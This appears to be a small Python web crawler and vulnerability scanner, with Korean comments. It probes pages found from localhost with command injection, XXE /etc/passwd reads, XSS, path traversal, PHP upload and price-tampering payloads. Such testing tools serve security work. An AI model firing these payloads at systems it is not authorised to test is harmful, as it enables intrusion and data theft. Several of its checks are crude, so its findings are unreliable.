import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import init, Fore
import ceawl

# Colorama 초기화
init(autoreset=True)

# 방문한 URL을 저장하는 세트
visited_urls = set()


# HTML에서 링크를 추출하고 GET/POST 파라미터를 파악하는 함수
def get_links_and_params(url, depth):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()

        # 페이지에서 GET 파라미터 분석
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if query_params:
            print(f"{'│   ' * depth}{Fore.GREEN}[GET] parameter: {query_params}")

        # POST 파라미터 추출 (form 태그 분석)
        forms = soup.find_all("form")
        for form in forms:
            form_method = form.get("method", "get").lower()
            if form_method == "post":
                inputs = form.find_all("input")
                post_params = {
                    input_tag.get("name"): input_tag.get("value")
                    for input_tag in inputs
                    if input_tag.get("name")
                }
                print(f"{'│   ' * depth}{Fore.CYAN}[POST] parameter: {post_params}")

        # 모든 링크 추출
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(url, a_tag["href"])
            parsed_link = urlparse(link)

            # 앵커(#) 링크 무시, 중복 URL 무시, 같은 도메인의 링크만 탐색
            if (
                parsed_link.fragment == ""
                and link not in visited_urls
                and link.startswith(url)
            ):
                links.add(link)
        return links
    except Exception as e:
        print(f"{'│   ' * depth}{Fore.RED}Error accessing {url}: {e}")
        return set()


# 재귀적으로 URL 구조 탐색
def crawl(url, depth=0):
    if url in visited_urls:  # 이미 방문한 URL은 탐색하지 않음
        return

    visited_urls.add(url)

    # URL 출력 (계층적 구조로 표시)
    if depth == 0:
        print(f"└── {Fore.WHITE}{url}")
    else:
        print(f"{'│   ' * (depth-1)}├── {Fore.WHITE}{url}")

    # URL의 모든 링크 가져오기 및 GET/POST 파라미터 파악
    links = get_links_and_params(url, depth + 1)

    # 하위 링크들에 대해 재귀적으로 크롤링
    for i, link in enumerate(links):
        if i == len(links) - 1:
            print(f"{'│   ' * depth}└──")
        crawl(link, depth + 1)


# 각 취약점을 테스트하는 함수 정의
def test_vulnerabilities(url, params):
    print(f"Testing vulnerabilities for: {url}")

    # OS Command Injection 테스트
    if params:
        for param in params.keys():
            os_command_result = test_os_command_injection(url, param)
            print(os_command_result)

            xss_result = test_xss(url, param)
            print(xss_result)

    # XXE Injection 테스트
    xxe_result = test_xxe_injection(url)
    print(xxe_result)

    # CSRF 테스트
    csrf_result = test_csrf(url)
    print(csrf_result)

    # 파일 다운로드 취약점 테스트
    file_download_result = test_file_download(url, params)
    print(file_download_result)

    # 파일 업로드 취약점 테스트
    file_upload_result = test_file_upload(url)
    print(file_upload_result)

    # 파라미터 변조 취약점 테스트
    param_tampering_result = test_parameter_tampering(url)
    print(param_tampering_result)

    # URL 접근 제한 미흡 테스트
    url_access_result = test_url_access_control(url)
    print(url_access_result)
    print("\n" + "=" * 50 + "\n")


# OS Command Injection 탐지
def test_os_command_injection(url, param):
    payload = "; ls"  # 공격 시도 페이로드
    response = requests.get(url, params={param: payload})
    if "bin" in response.text:
        return f"{Fore.RED}OS Command Injection detected on {param}"
    return f"{Fore.GREEN}No OS Command Injection on {param}"


# XXE Injection 탐지
def test_xxe_injection(url):
    payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>"""

    headers = {"Content-Type": "application/xml"}
    response = requests.post(url, data=payload, headers=headers)

    if "root:x" in response.text:
        return f"{Fore.RED}XXE Injection detected"
    return f"{Fore.GREEN}No XXE Injection"


# XSS 탐지
def test_xss(url, param):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url, params={param: payload})
    if payload in response.text:
        return f"{Fore.RED}XSS detected on {param}"
    return f"{Fore.GREEN}No XSS on {param}"


# CSRF 탐지
def test_csrf(url):
    response = requests.get(url)
    if "csrf_token" not in response.text:
        return f"{Fore.RED}CSRF vulnerability detected (No CSRF token)"
    return f"{Fore.GREEN}No CSRF vulnerability"


# 파일 다운로드 취약점 탐지
def test_file_download(url, params):
    if params:
        for param in params.keys():
            payload = "../etc/passwd"
            response = requests.get(url, params={param: payload})
            if "root:x" in response.text:
                return f"{Fore.RED}File Download vulnerability detected on {param}"
    return f"{Fore.GREEN}No File Download vulnerability"


# 파일 업로드 취약점 탐지
def test_file_upload(url):
    files = {"file": ("malicious.php", '<?php echo "Hacked"; ?>')}
    response = requests.post(url, files=files)
    if "File uploaded" in response.text:
        return f"{Fore.RED}File Upload vulnerability detected"
    return f"{Fore.GREEN}No File Upload vulnerability"


# 파라미터 변조 취약점 탐지
def test_parameter_tampering(url):
    tampered_price = "1"  # 가격을 임의로 낮게 설정
    response = requests.post(url, data={"price": tampered_price})
    if "Order confirmed" in response.text:
        return f"{Fore.RED}Parameter Tampering vulnerability detected"
    return f"{Fore.GREEN}No Parameter Tampering vulnerability"


# URL 접근 제한 미흡 탐지
def test_url_access_control(url):
    response = requests.get(url)
    if "Access Denied" not in response.text:
        return f"{Fore.RED}URL Access Control vulnerability detected"
    return f"{Fore.GREEN}No URL Access Control vulnerability"


# 시작 URL 지정
start_url = "http://127.0.0.1/"  # 대상 URL을 여기에 입력
crawl(start_url)

# 수집된 URL과 파라미터에 대해 취약점 테스트 수행
for url in visited_urls:
    # 각 URL에 대해 GET 파라미터를 추출하여 테스트
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    test_vulnerabilities(url, query_params)
